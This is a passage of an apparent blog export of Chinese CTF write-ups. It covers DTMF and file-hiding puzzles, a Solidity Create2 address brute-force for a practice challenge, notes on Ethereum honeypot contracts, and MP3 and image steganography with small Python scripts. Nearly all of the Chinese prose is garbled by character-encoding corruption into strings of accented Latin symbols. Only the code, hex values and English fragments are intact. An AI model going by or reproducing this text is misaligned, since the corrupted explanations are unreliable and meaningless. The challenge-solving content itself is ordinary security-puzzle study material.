    <content type="text"><![CDATA[ÂâçË®Ä Êâì‰∫Ü‰∏ÄÂ§©ÁöÑ GKCTF2020 ,‰∏äÈù¢ÁöÑÂõæÂêéÈù¢Âá†ÈÅìÊòØÂêéÊù•Ê†πÊçÆ ÂÆòÊñπWP Â§çÁé∞ÁöÑ, ÊèêÂèñÁ†Å: du34 Á´üÁÑ∂Êää crypto Áªô AK ‰∫Ü,Âá∫È¢ò‰∫∫È¢òÁõÆÂá∫ÁÆÄÂçï‰∫Ü,‰∏çÁÑ∂Êàë‰∏ÄÈÅì‰πüÂÅö‰∏çÂá∫Êù•,ÂÆ≥,ÂÖ∂ÂÆÉÈ¢òÁõÆ‰πüÂÅö‰∏çÂä® misc ‰πüÂÅöÂá∫Êù•‰∏ÄÈÅì,‰ªÖ‰ª•Ê≠§ËÆ∞ÂΩï‰∏Ä‰∏ã ÈôÑ‰ª∂ https://pan.baidu.com/s/14bITFhiiPysPMFZTqzYKYA ÂØÜÁ†Å: tn6x Solutions Ëß£ÂéãÂéãÁº©ÂåÖÂæóÂà∞ .wav Âíå .jpeg Êñá‰ª∂ Áî® Audacity ÂàÜÊûê wav Êñá‰ª∂,Âú®È¢ëË∞±Êú´Â∞æÊâæÂà∞‰∏ãÈù¢‰∏ÄÊÆµ DTMF Êã®Âè∑,Áî® dtmf2num.exe Â∑•ÂÖ∑ËØÜÂà´Âä†‰∏ä‰∫∫Â∑•ÊØîÂØπ‰øÆÊîπ,ÊúÄÂêéÂæóÂà∞ #222833344477773338866# Ëøô‰∏≤‰∏úË•ø, Êü•ÈòÖËµÑÊñô ctf-wiki ,ÊâãÊú∫ÈîÆÁõòÂØÜÁ†Å,ÊØîÂ¶Ç 222 ÂØπÂ∫îÁöÑÂ∞±ÊòØ 23 ,ÊòØ c Â≠óÊØç,‰æùÊ¨°Á±ªÊé®,ÊúÄÂêéÂæóÂà∞ #ctfisfun# ÁÑ∂ÂêéÂç°‰Ωè‰∫Ü,Ëøá‰∫ÜÂ•Ω‰πÖ,È¢òÁõÆÊîæÂá∫ hint : FreeFileCamouflage ,ÁÑ∂ÂêéÂõûËøáÂ§¥ÂéªÊü•ÁúãÂéãÁº©ÂåÖÊ≥®Èáä,‰πüÊúâËøôÊ†∑‰∏ÄÊÆµËØù,ËôΩÁÑ∂ÂºÄÂ§¥ÊòØ‰π±Á†Å Êü•ÈòÖËµÑÊñô,ÂèëÁé∞ FreeFileCamouflage ÊòØ‰∏ÄÊ¨æÂ∞ÜÈáçË¶ÅÊñáÊ°£‰ª• AES Âä†ÂØÜÁÆóÊ≥ïÂ≠òÊîæÂà∞ JPG Ê†ºÂºèÁöÑÂõæÁâá‰∏≠,‰∫éÊòØÂºÄÂßã‰∏ãËΩΩ‰ΩøÁî®Â¶Ç‰∏ã, passwd Â∞±ÊòØ‰πãÂâçÂæóÂà∞ÁöÑ ctfisfun ÂæóÂà∞‰∏Ä‰∏™ flag.txt Êñá‰ª∂: flag{Pudd1n!!_y0u_F1nd_m3!}]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>GKCTF2020</tag>
        <tag>Harley Quinn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Create2]]></title>
    <url>%2F2020%2FCreate2%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Êô∫ËÉΩÂêàÁ∫¶ÁîüÊàêÂêàÁ∫¶Âú∞ÂùÄÁöÑÁ¨¨‰∫åÁßçÊñπÂºè Create2 ‰ª•‰∏ÄÈÅì‰æãÈ¢òËß£Èáä ËÆ°ÁÆóÂú∞ÂùÄÊúâ‰∏§ÁßçÊñπÂºè Create : keccak256(rlp.encode(deployingAddress, nonce))[12:] Create2 : keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:] ÂÖ≥‰∫é Create2 ,ËøôÈáåÂ∞±‰∏ç‰ªãÁªç‰∫Ü,ÂèØ‰ª•ÂèÇËÄÉ EIP 1014: CREATE2 Êåá‰ª§ 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;interface IName &#123; function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123; bool public isComplete; function authenticate() public &#123; require(isSmarx(msg.sender)); require(isBadCode(msg.sender)); isComplete = true; &#125; function isSmarx(address addr) internal view returns (bool) &#123; return IName(addr).name() == bytes32("smarx"); &#125; function isBadCode(address _addr) internal pure returns (bool) &#123; bytes20 addr = bytes20(_addr); bytes20 id = hex"000000000000000000000000000000000badc0de"; bytes20 mask = hex"000000000000000000000000000000000fffffff"; for (uint256 i = 0; i &lt; 34; i++) &#123; if (addr &amp; mask == id) &#123; return true; &#125; mask &lt;&lt;= 4; id &lt;&lt;= 4; &#125; return false; &#125;&#125; ÂæàÁÆÄÂçï,Ë¶ÅÊ±Ç name ÊòØ smarx ,Âπ∂‰∏î msg.sender ÂåÖÂê´ badc0de ,ÂèØÈÄöËøá‰∏ãÈù¢ÂêàÁ∫¶Ëß£ÂÜ≥,Âè™ÈúÄË¶ÅÂêàÁ∫¶Âú∞ÂùÄÂåÖÊã¨ badc0de Âç≥ÂèØ 123456789pragma solidity ^0.5.12;contract BadCodeSmarx is IName &#123; function callAuthenticate(address _challenge) public &#123; FuzzyIdentityChallenge(_challenge).authenticate(); &#125; function name() external view returns (bytes32) &#123; return bytes32("smarx"); &#125;&#125; Áî® Create2 ÊñπÊ≥ïËß£ÂÜ≥,Â¶Ç‰∏ã,Êàë‰ª¨Âè™ÈúÄË¶ÅËÆ°ÁÆóÂá∫Áõ∏ÂØπÂ∫îÁöÑ salt Âç≥ÂèØ, Deployer Ë¢´ÈÉ®ÁΩ≤Âú® 0xca4dfd86a86c48c5d9c228bedbeb7f218a29c94b 12345678910111213contract Deployer &#123; // contractBytecodeÊòØÂæÖÈÉ®ÁΩ≤ÂêàÁ∫¶ÁöÑbytecode bytes contractBytecode = hex"608060405234801561001057600080fd5b5061015d806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806306fdde031461003b5780637872ab4914610059575b600080fd5b61004361009d565b6040518082815260200191505060405180910390f35b61009b6004803603602081101561006f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100c5565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010d57600080fd5b505af1158015610121573d6000803e3d6000fd5b505050505056fea265627a7a72315820fb2fc7a07f0eebf799c680bb1526641d2d905c19393adf340a04e48c9b527de964736f6c634300050c0032"; function deploy(bytes32 salt) public &#123; bytes memory bytecode = contractBytecode; address addr; assembly &#123; addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; &#125;&#125; ÂÜô‰∫Ü‰∏Ä‰∏™ËÑöÊú¨ÁàÜÁ†¥ salt, Âè™Ë¶ÅÂåÖÂê´ badc0de Âç≥ÂèØ 1234567891011121314151617from web3 import Web3s1 = '0xffca4dfd86a86c48c5d9c228bedbeb7f218a29c94b's3 = '4670da3f633e838c2746ca61c370ba3dbd257b86b28b78449f4185480e2aba51'i = 0while(1): salt = hex(i)[2:].rjust(64, '0') s = s1+salt+s3 hashed = Web3.sha3(hexstr=s) hashed_str = ''.join(['%02x' % b for b in hashed]) if 'badc0de' in hashed_str[24:]: print(salt,hashed_str) break i += 1 print(salt) ÁªìÊûúÂ¶Ç‰∏ã ÊúÄÂêéË∞ÉÁî® Deployer.deploy(0x00...005b2bfe) Âç≥ÂèØÊää BadCodeSmarx ÂêàÁ∫¶ÈÉ®ÁΩ≤Âà∞Âú∞ÂùÄ 0xa905a3922a4ebfbc7d257cecdb1df04a3badc0de ‰∏ä ‰πüÊúâÂ§ß‰Ω¨ÈÄöËøá Create ÊñπÂºèËß£ÂÜ≥ÁöÑ,ÊúâÂÖ¥Ë∂£ÁöÑÂèØ‰ª•ÂèÇËÄÉ https://www.anquanke.com/post/id/154104#h3-11 , Â∏¶‰Ω¨Ëá™Ë°åÈ™åËØÅ,ÊàëÊ≤°ÊúâÈ™åËØÅ]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Create2</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ËúúÁΩêÂêàÁ∫¶]]></title>
    <url>%2F2020%2FHoneypot-Contract%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Áúã‰∫ÜËúúÁΩêÂêàÁ∫¶ÁöÑ‰∏Ä‰∫õÁü•ËØÜ,ÊÑüËßâÈùûÂ∏∏ÊúâÊÑèÊÄù ËúúÁΩêÂêàÁ∫¶ÁöÑÂà©Áî®ÁÇπÂ§ßÈÉΩÂæàÂ∑ßÂ¶ô,ÁõÆÁöÑÈÉΩÊòØ‰∏∫‰∫ÜËØ±ÊÉë‰Ω†ÂêëÂêàÁ∫¶ÈáåÈÄÅÈí± ËøôÁØáÊñáÁ´†Â∞±‰∏çÂØπÂì™‰∏™ËúúÁΩêÂêàÁ∫¶ÂÆû‰æãÂÅöÂÖ∑‰ΩìÁöÑÂàÜÊûê‰∫Ü,Â¶ÇÊûúÂ∏¶‰Ω¨ÊÉ≥ÁúãÁöÑËØù,ÂèØ‰ª•ÂèÇËÄÉÂàÜÊûê‰∏Ä‰∏™ÊúâË∂£ÁöÑËúúÁΩêÂêàÁ∫¶ Âíå ‰ª•Â§™ÂùäËúúÁΩêÊô∫ËÉΩÂêàÁ∫¶ÂàÜÊûê,ËøôÈáåÂè™ËÆ∞ÂΩï‰∏Ä‰∏ãËá™Â∑±ÁöÑÂøÉÂæó etherscan ‰∏äÊúâ‰∏Ä‰∏™ÂèØËßÅ‰∫§ÊòìÁöÑÊú∫Âà∂,Âú® etherscan ‰∏äÂØπ‰∫éÂêàÁ∫¶‰∏éÂêàÁ∫¶Áõ¥Êé•ÁöÑÊ∂àÊÅØ‰º†ÈÄÅ,ÂΩì msg.value = 0 Êó∂ÂÆÉÊòØ‰∏çÊòæÁ§∫ÁöÑ,Âõ†‰∏∫ÂÆÉ‰ª¨Ë¢´ËßÜ‰∏∫ÂêàÁ∫¶Èó¥ÁöÑÁõ∏‰∫íË∞ÉÁî®ËÄå‰∏çÊòØ‰∏ÄÁ¨î‰∫§Êòì.ÊâÄ‰ª•ÂΩìÊàë‰ª¨ÊãøÂà∞‰∏Ä‰∏™ÂêàÁ∫¶Âú∞ÂùÄÊó∂,Áî® etherscan Êü•ÁúãËØ•ÂêàÁ∫¶Âú∞ÂùÄÁöÑ‰∫§ÊòìÂπ∂‰∏ç‰∏ÄÂÆöÊòØÂÖ®ÈÉ®ÁöÑ‰∫§Êòì‰ø°ÊÅØ.‰ΩÜÁúã‰∏çÂà∞ÁöÑËøôÈÉ®ÂàÜ‰ø°ÊÅØÂèØ‰ª•ÈÄöËøá etherchain Êù•Êü•Áúã,ÊØîÂ¶Ç‰∏ãÈù¢ÁöÑ‰æãÂ≠ê etherchain ‰∏çÂÉè etherscan Ëá™Â∏¶ decode ,ÊâÄ‰ª•ÈúÄË¶ÅÂØπ Input ÊâãÂä®Ëß£Á†Å,ÂèØ‰ª•‰ΩøÁî® abi-decoder Â∑•ÂÖ∑ ÂØπ‰∫éËúúÁΩêÂêàÁ∫¶,ÊâÄÊúâÁöÑ‰∫§ÊòìËÆ∞ÂΩïË¶ÅËØ¶ÁªÜÂÆ°ËÆ°,Âõ†‰∏∫Âú®‰Ω†ÊãøÂà∞ÂêàÁ∫¶‰πãÂâç,‰Ω†‰∏çÁü•ÈÅìÊòØÂê¶ÊúâÂÖ∂‰ªñ‰∫∫(ÂåÖÊã¨ÂêàÁ∫¶ÂàõÂª∫ËÄÖ)ÂØπÂêàÁ∫¶ËøõË°åËøáÊìç‰Ωú ËúúÁΩêÂêàÁ∫¶‰∏ÄËà¨Âè™ÈÄÇÂêàÂú®‰∏ªÈìæ‰∏ä,‰∏çÈÄÇÂêà CTF Âõ†‰∏∫ËúúÁΩêÂêàÁ∫¶‰∏ÄËà¨Âè™ÊòØ‰∏∫‰∫Ü‚ÄúÈ™óÈí±‚Äù,ËÄåÂàöÂºÄÂßãÁöÑÊó∂ÂÄô‰ºöÂêëÈáåÈù¢ËΩ¨‰∫õÈí±,ËØ±‰ΩøÂà´‰∫∫ÂêëÈáåÈù¢ÂÖÖÈí±,ÁÑ∂ÂêéÊääÈáåÈù¢ÁöÑÈí±ÊèêÂá∫Êù•,Âú®ÊµãËØïÈìæ‰∏ä,Ëøô‰∫õÈí±ÊòØÊó†ÊÑè‰πâÁöÑ ËÄå‰∏îÂ¶ÇÊûú‰∏ÄÊó¶Êúâ‰∫∫ËØÜÁ†¥ÁöÑËØù,Â∞±‰ºöÊúâ‰∫§ÊòìËÆ∞ÂΩï,Â¶ÇÊûúÊòØÂú® CTF ÊØîËµõÈáåÈù¢,ÂÖ∂‰ªñ‰∫∫Â∞±‰ºöÂàÜÊûê‰∫§ÊòìËÆ∞ÂΩï,Â∞±‰ºöÂæàÂÆπÊòìÊòéÁôΩËúúÁΩêÂêàÁ∫¶‰∫Ü,ËÄå‰∏î‰∏ÄÊó¶Êúâ‰∏Ä‰∏™‰∫∫ÂÅöÂá∫Êù•,ÈáåÈù¢ÁöÑÈí±Â∞±Ê≤°‰∫Ü,Â§±Âéª‰∫ÜËúúÁΩêÈ™óÈí±ÁöÑÊÑè‰πâ ‰ª•Â§™ÂùäÁ•ûÂ•áÊú∫Âà∂ÂæàÂ§ö,ÂØπ‰ª•Â§™ÂùäÊúâ‰∏ÄÂÆö‰∫ÜËß£‰πü‰∏çË¶ÅÁõ≤ÁõÆËá™‰ø°,‰∏çÂ∞èÂøÉÂ∞±‰ºöÊ†ΩË∑üÂ§¥,Áâ¢ËÆ∞Â§©‰∏ä‰∏ç‰ºöÁôΩÁôΩÊéâÈ¶ÖÈ•º,‰∏âÊÄùËÄåÂêéË°å]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>ËúúÁΩêÂêàÁ∫¶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DelCTF2020 mc_easybgm]]></title>
    <url>%2F2020%2FDelCTF2020-mc-easybgm%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Â§çÁé∞ DelCTF2020 mc_easybgm ÈôÑ‰ª∂ https://pan.baidu.com/s/178YHh19R5Pquoh74J4jODg ÂØÜÁ†Å: 7m3y Solutions È¢òÁõÆÁªô‰∫ÜÊèêÁ§∫ hint: easy stego,Â∫îËØ•ÊòØÂíå mp3 ÈöêÂÜôÊúâÂÖ≥,ÊåâÁÖßÂ∏∏ËßÑÊÄùË∑Ø,Êúâ‰∏âÁßçÊÄùË∑Ø: Áõ¥Êé•Êü•Êâæ flag Êü•ÁúãËØ•Èü≥È¢ëÊñá‰ª∂ÁöÑÊ≥¢ÂΩ¢Âõæ„ÄÅÈ¢ëË∞±ÂõæÔºåÊòØÂê¶Â≠òÂú®Áõ∏ÂÖ≥‰ø°ÊÅØÂèØ‰ª•ËΩ¨Âåñ‰∏∫Êë©ÊñØÁîµÁ†Å Êü•Áúã mp3 ‰∏≠ÊòØÂê¶Âê´ÊúâÈöêËóèÊñá‰ª∂ÔºåÊèêÂèñÊñá‰ª∂ ÂØπ‰∫éËØ•È¢òÁõÆÊù•ËØ¥,ÈÉΩÊ≤°Êúâ‰ªÄ‰πàÁªìÊûú,Êü•ÈòÖÂà∞ mp3 Èü≥È¢ëÂ∏ßÂ≠òÂú®Â∏ßÂ§¥‰ø°ÊÅØ,ÂèØÂèÇËÄÉÂ¶Ç‰∏ãÈìæÊé•: https://blog.csdn.net/jeffchenbiao/article/details/7332863?%3E https://www.eefocus.com/lynn19861207/blog/10-03/187260_eae32.html ÂèëÁé∞Â≠òÂú®‰øùÁïôÂ≠ó‰Ωç private bit ÂèØÊéßÂÜôÂÖ•‰ø°ÊÅØ,Âõ†Ê≠§,Âè™ÈúÄË¶ÅÊèêÂèñÊØè‰∏Ä‰∏™ mf ÁªÑ‰∏≠ÁöÑËØ•‰Ωç,ÁªÑÂêàËµ∑Êù•,Â∞±ÊòØÁ≠îÊ°à ÂèØ‰ª•‰ªéÂõæ‰∏≠ÁúãÂà∞ ms ÂºÄÂßã‰Ωç‰∏∫ 0x28A3 ,Âç≥Á¨¨ 10403 Â≠óËäÇ 12345678910111213uint32 frame_sync : 12uint32 mpeg_id : 1uint32 layer_id : 2uint32 protection_bit : 1uint32 bitrate_index : 4uint32 frequency_index : 2uint32 padding_bit : 1uint32 private_bit : 1uint32 channel_mode : 2uint32 mode_extension : 2uint32 copyright : 1uint32 original : 1uint32 emphasis : 2 ÊÄªÂÖ± 12+1+2+1+4+2+1+1+2+2+1+1+2=32 ,Âç≥ÊÄªÂÖ± 4 Â≠óËäÇ, private_bit ‰∏∫ 24 ,ÊâÄÂú®ÁöÑÂ≠óËäÇ‰∏∫Á¨¨ 3 ‰∏™Â≠óËäÇ,Âõ†Ê≠§ËØ•Â≠óËäÇÂØπÂ∫îÁöÑÂú∞ÂùÄ‰∏∫ 10403+2=10405 ËßÇÂØüÊØè‰∏Ä‰∏™ mf ÁªÑ,Â§ßÂ∞èÈÉΩ‰∏∫ 0x1A1 , Âç≥ 417 Â≠óËäÇ ÂèØÈÄöËøáÂÜôËÑöÊú¨Ëß£ÂÜ≥,Â¶Ç‰∏ã: 12345678910111213import reimport binasciin = 10405result = ''fina = ''file = open('C:/Users/lenovo/Desktop/bgm.mp3','rb')while n &lt; 1369844 : file.seek(n,0) n += 417 file_read_result = file.read(1) read_content = bin(ord(file_read_result))[-1] result = result + read_contentprint result ËæìÂá∫Â¶Ç‰∏ã: 1101111101000010010101110011010101000001001010110110011000010001011111010001000101000110001001110000011001110101011111010001011100110001000101100010010101100001011001100111011001001011010110010111110100000110000101110111110101100110010110110000011001100011010001100110011001110101011011110011000100010101011000010100011001010011000100010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 ÂêéÈù¢‰∏ÄÂ†Ü 0 ‰∏≤ÈÉΩ‰∏çË¶Å,Âè™‰øùÁïôÂà∞ 8 ÁöÑÂÄçÊï∞ÂàöÂ•ΩÂÆåÊàê,ÂêéÈù¢ÁöÑ 0 ÂÖ®ÈÉ®ËàçÂºÉÔºåÂêåÊó∂Â∞Ü‰øùÁïôÁöÑÊï∞ÊçÆÂèçËΩ¨ÔºåÂπ∂‰∏î 8 ‰∏™‰∏ÄÁªÑÂàÜÂâ≤ÂºÄÔºåËΩ¨ÊàêÂ≠óÁ¨¶‰∏≤Âç≥ÂèØ 123456789import refina = ''result = '010001000110010100110001010000110101010001000110011110110101011100110011001100010110001100110000011011010011001101011111011101000011000001011111010011010110100100110111001100110100001101010010001101000100011001110100010111110101011100110000011100100011000101000100010111110100010000110011011010100100000101010110011101010010000101111101'textArr = re.findall('.&#123;'+str(8)+'&#125;', result)# textArr.append(result[(len(textArr)*8):])for i in textArr: fina = fina + chr(int(i,2)).strip('\n')print fina ÊúÄÂêéËæìÂá∫Â¶Ç‰∏ã: ÂèÇËÄÉ ÂèÇËÄÉhttps://l1near.top/index.php/2020/05/06/52.htmlhttps://www.cnpanda.net/ctf/342.html]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>DelCTF2020</tag>
        <tag>mc_easybgm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NPUCTF2020 Á¢∞‰∏äÂΩ©ËôπÔºåÂêÉÂÆöÂΩ©ËôπÔºÅ]]></title>
    <url>%2F2020%2FNPUCTF2020-rainbow%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Â§çÁé∞ NPUCTF2020 Á¢∞‰∏äÂΩ©ËôπÔºåÂêÉÂÆöÂΩ©ËôπÔºÅ ÈôÑ‰ª∂ https://pan.baidu.com/s/1Ok_xleNJ_VDqVYUnYpWIJQ ÂØÜÁ†Å: ijdv Solutions ‰∏ãËΩΩÈôÑ‰ª∂Âπ∂Ëß£Âéã,Êúâ‰∏â‰∏™Êñá‰ª∂Ôºölookatme.txt„ÄÅmaybehint.txt Âíå secret ÊâìÂºÄ lookatme.txt ÂèëÁé∞Êñá‰ª∂ÊòØ‰∏Ä‰∏≤Êï∞Â≠óÔºåÂÖ®ÈÄâ‰ª•ÂêéÂèëÁé∞ÊúÄ‰∏ãÊñπÊúâÂá†‰∏™Á©∫Ê†ºÂíåTABÊç¢Ë°åÁªÑÊàêÁöÑÁ©∫„ÄÇËÅîÊÉ≥Âà∞ÊòØÊë©ÊñØÂØÜÁ†ÅÔºåÁ©∫Ê†º = .ÔºåTAB = - ÁøªËØëÂá∫Êù•ÁöÑÊë©ÊñØÂØÜÁ†ÅÊòØÔºö.- ..- - --- -.- . -.-- ,Ëß£ÂØÜÂæóÂà∞ÂØÜÊñá autokey ,Ê†πÊçÆËß£Âá∫Êù•ÁöÑÂØÜÊñáÂèØ‰ª•Âà§Êñ≠‰∏äÈù¢ÁöÑÂ≠óÁ¨¶‰∏≤ÁªèËøá‰∫Ü autokey Âä†ÂØÜ ÂÜçÁúã‰∏Ä‰∏ã maybehint.txt ,ÊèêÁ§∫Âú®txt‰∏≠ÈöêËóè‰∫Ü‰∏Ä‰∫õ‰∏ú‚ªÑ,Áî® vim Êü•Áúã ÂæàÊòéÊòæ‰∏∫Èõ∂ÂÆΩÂ∫¶Â≠óÁ¨¶ÈöêÂÜôÔºå‰∏îÁî±„ÄÅ„ÄÅËøô‰∏âÁßçÂ≠óÁ¨¶ÁªÑÊàê, ÂéªÊ≠§ÁΩëÁ´ôËß£ÂØÜ,ÂæóÂà∞ do u know NTFS? Â¶Ç‰∏ãÂõæ Áî® ntfsstreamseditor ÊèêÂèñÂ¶Ç‰∏ã Á®çÂä†ËßÇÂØüÂèØ‰ª•ÂèëÁé∞ÂÖ∂‰∏≠Âè™ÊúâÂá†ÁßçÂ≠óÁ¨¶ÔºåËÄå‰∏îÈÉΩ‰∏∫ÈáçÂ§çÁöÑÔºåÊçÆÊ≠§ÂèØ‰ª•Â∞ùËØïËØçÈ¢ëÂàÜÊûê 1234from collections import Counterf=open('out.txt','r')f_read=f.read()print Counter(f_read) ÂæóÂà∞ÁªìÊûú‰∏∫ËøôÂá†ÁßçÂ≠óÁ¨¶‰ªéÂ§öÂà∞Â∞ëÁöÑÊéíÂàóÈ°∫Â∫èÔºåÁªÑÂêàÂú®‰∏ÄËµ∑ÂæóÂà∞ ZW5jcnlwdG8= , base64 Ëß£ÂØÜÂæóÂà∞ encrypto ,ÁôæÂ∫¶ encrypto ÂèØÁü•ÂÖ∂ÊòØ‰∏Ä‰∏™Âä†ÂØÜËΩØ‰ª∂Ôºå‰∏ãËΩΩÂêéÂ∞ùËØïÁî®ÂÖ∂Âä†ÂØÜ‰∏Ä‰∏™Êñá‰ª∂ÔºåÂèØ‰ª•ÂæóÁü•ÁªèËøáÂÖ∂Âä†ÂØÜÁöÑÊñá‰ª∂ÂêéÁºÄÂêç‰∏∫ cryptoÔºåÂ∞Ü secret Êñá‰ª∂ÂêéÁºÄÂêçÊîπ‰∏∫ secret.crypto Âç≥ÂèØÊâìÂºÄÊñá‰ª∂ ÂèØ‰ª•ÁúãÂà∞Êñá‰ª∂Ë¢´Âä†ÂØÜÔºåÊÉ≥Âà∞ autokeyÔºå‰ΩÜÊòØÁî±‰∫éÊ≤°ÊúâÁªôÂá∫Âä†ÂØÜÂØÜÈí•ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂØπÂÖ∂ËøõË°å ÁàÜÁ†¥ÔºåÂèÇËÄÉ Ê≠§ÁΩëÂùÄ,ÂΩìÁÑ∂,Âú® break_autokey ‰πüÂáÜÂ§áÂ•Ω‰∫Ü,ËøêË°åÁªìÊûúÂ¶Ç‰∏ãÂõæ ÁªìÂêà hint Â∞èÂÜô, ÂØÜÁ†Å‰∏∫ iamthepasswd ÂèØÊòØÁî®Ê≠§ÂØÜÁ†ÅËß£Ëøô‰∏™Âä†ÂØÜÊñá‰ª∂Êó∂Âç¥‰∏ÄÁõ¥Ëß£‰∏çÂºÄÔºåÂÜçÁªìÂêàÈ¢òÁõÆÊèèËø∞‰∏≠Âä†Á≤óÁöÑÊã¨Âè∑Âà†ÊéâÔºåÊé® ÊµãÊòØÂê¶Âú®Êñá‰ª∂‰∏≠ËøòÈöêËóè‰∫Ü‰ªÄ‰πà‰ø°ÊÅØÔºåÁî® strings ÂëΩ‰ª§Êü•Áúã‰∏Ä‰∏ãÊñá‰ª∂ÂèØ‰ª•ÂèëÁé∞ËøôÊ†∑‰∏ÄÊù°‰ø°ÊÅØ 1(Oh!Youcaughtme!But...) Â∞ÜÂÖ∂Âà†ÂéªÂêéÂÜçÊ¨°Â∞ùËØïËß£ÂØÜÔºåÂç≥ÂèØÊàêÂäüËß£ÂØÜ,Ëß£ÂØÜÂêéÂæóÂà∞‰∏ÄÂº† ÂΩ©Ëôπ.png ÂõæÁâá, binwalk Êü•ÁúãÊúâ‰∏™ÂéãÁº©ÂåÖ, Áî® foremost ÂàÜÁ¶ªÂæóÂà∞‰∏Ä‰∏™Âä†ÂØÜÂéãÁº©ÂåÖ,ÊâÄ‰ª•Áé∞Âú®ÈúÄË¶ÅÂØªÊâæÂØÜÁ†Å ‰ªîÁªÜËßÇÂØüÂõæÁâáÂèØ‰ª•ÂèëÁé∞ÔºåÁî±‰∫îÁßç‰∏çÂêåÈ¢úËâ≤ÁöÑÊ®™Êù°ÂàÜÈöîÂºÄÁöÑÂÖ≠Âùó‚ª©Ëâ≤ÊúâÁï•ÂæÆÊ∑±ÊµÖÁöÑÂ∑ÆÂºÇÔºå Áî® gimp Êàñ ps ÊâìÂºÄÊèêÂèñ‰∏Ä‰∏ãÈ¢úËâ≤ ÂàÜÂà´ÊèêÂèñ‰∏Ä‰∏ãÂÖ≠Áßç‚ª©Ëâ≤ÔºåÂèØ‰ª•ÂèëÁé∞‰ªñ‰ª¨È¢úËâ≤ÁöÑ HTMLÊ†áËÆ∞ Âè™ÊúâÊúÄÂêé‰∏§‰Ωç‰∏çÂêåÔºå‰ªé‰∏äÂà∞‰∏ã ‰æùÊ¨°‰∏∫70„ÄÅ40„ÄÅ73„ÄÅ73„ÄÅ57„ÄÅ64ÔºåÂ∞ÜËøôÂá†‰∏™Êï∞ÁªÑÂêàÂú®‰∏ÄËµ∑ÔºåÁî® Converter ÁöÑ Hex to Text ÔºåÊàñËÄÖ python ÁöÑ decode(&#39;hex&#39;) ÔºåÂ∞±ÂèØ‰ª•ÂæóÂà∞Ëß£ÂéãÂØÜÁ†Å Ëß£ÂéãÂêéÂæóÂà∞ docx Êñá‰ª∂ÔºåÊÉ≥Âà∞ word ÈöêÂÜôÔºåÊòæÁ§∫ÈöêËóèÊñáÂ≠ó ‰ªîÁªÜËßÇÂØü‰∏äÈù¢ÁöÑ‰∏Ä‚ªì‰∏≤Â≠óÊØçÔºåÂèØ‰ª•Âú®‰ºóÂ§öÁöÑÂ∞èÂÜôÂ≠óÊØç‰∏≠ÂèëÁé∞Âá†‰∏™Â§ßÂÜôÂ≠óÊØç,ÊåâÁÖßÈ°∫Â∫èÁªÑÂêàËµ∑Êù•ÂæóÂà∞ ALPHUCK, Êü•ÈòÖÂèØÁü•ÊòØ‰∏ÄÁßç Programming Language ,Âè™Áî± a,c,e,i,j,o,p,s Ëøô 8 ‰∏™Â∞èÂÜôÂ≠óÊØçÁªÑÊàêÔºåÊâÄ‰ª•Âà†Âéª‰∏äÈù¢ÁöÑÂá†‰∏™Â§ßÂÜôÂ≠óÊØçÔºåÂú®Á∫øÁΩëÁ´ôËß£Á†Å‰∏Ä‰∏ãÂç≥ÂèØÂæóÂà∞ flag]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>npuctf2020</tag>
      </tags>
